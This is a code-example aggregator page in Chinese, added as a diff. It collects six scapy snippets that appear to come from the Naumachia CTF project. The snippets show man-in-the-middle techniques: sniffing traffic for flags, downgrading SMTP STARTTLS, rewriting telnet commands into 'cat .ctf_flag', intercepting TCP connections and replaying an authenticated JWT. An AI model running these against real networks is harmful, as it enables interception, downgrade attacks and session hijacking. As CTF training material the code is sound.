@@ -1,0 +1,108 @@
+示例1: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
+                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))
+
+                try:
+                    load = pkt.load.decode('utf-8')
+                except UnicodeDecodeError:
+                    return
+
+                m = re.search(self.flagpattern, load)
+                if m:
+                    self.flag = m.group(0)
+                    self.sniffer.stop() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:15，代码来源:letter.py
+
+
+
+ 
+示例2: corrupttls
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def corrupttls(pkt):
+        """corrupttls looks for an SMTP client packet with `STARTTLS` and replaces it with `STARTFOO`"""
+        if all(layer in pkt for layer in (scapy.IP, scapy.TCP, scapy.Raw)):
+            if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
+                pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')
+        return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:8，代码来源:letter.py
+
+
+示例3: injectcmd
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def injectcmd(pkt):
+        """injectcmd looks for a telnet client packet and if it has the `cd` command, reaplces it with `cat .ctf_flag`"""
+        if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
+            if scapy.Raw in pkt and pkt[scapy.TCP].dport == 23:
+                raw = pkt[scapy.Raw]
+                if b'cd ' in raw.load:
+                    raw.load = b'cat .ctf_flag\n'
+        return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:10，代码来源:piggies.py
+
+
+
+ 
+示例4: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.UDP, scapy.Raw)):
+                logger.debug(pkt.sprintf('%IP.src%: %Raw.load%'))
+
+                try:
+                    load = pkt.load.decode('utf-8')
+                except UnicodeDecodeError:
+                    return
+
+                m = re.search(self.flagpattern, load)
+                if m:
+                    self.question = m.group(0)
+                elif 'Yup' in load and self.question is not None:
+                    self.flag = self.question
+                    self.sniffer.stop() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:17，代码来源:middle.py
+
+
+示例5: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.TCP)):
+                logger.debug(pkt.sprintf("[%Ether.src%]%IP.src%:%TCP.sport% > [%Ether.dst%]%IP.dst%:%TCP.dport% %TCP.flags%"))
+                if pkt[scapy.Ether].dst == str(net.ifhwaddr(self.iface)) and pkt[scapy.TCP].flags == 2:
+                    self.bindaddr, self.bindport = pkt[scapy.IP].dst, pkt[scapy.TCP].dport
+                    if self._thread is None or not self._thread.is_alive():
+                        self._thread = threading.Thread(target=self.intercept)
+                        self._thread.start() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:10，代码来源:scraps.py
+
+
+
+ 
+示例6: filter
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import all [as 别名]
+def filter(self, pkt):
+            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
+                tcp, raw = pkt[scapy.TCP], pkt[scapy.Raw]
+                if tcp.sport == self.port:
+                    try:
+                        if jwt.decode(raw.load, verify=False)['auth']:
+                            self.authed_token = raw.load
+                        elif self.authed_token is not None:
+                            raw.load = self.authed_token
+                    except (jwt.DecodeError, KeyError):
+                        pass
+            return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:14，代码来源:recipe.py
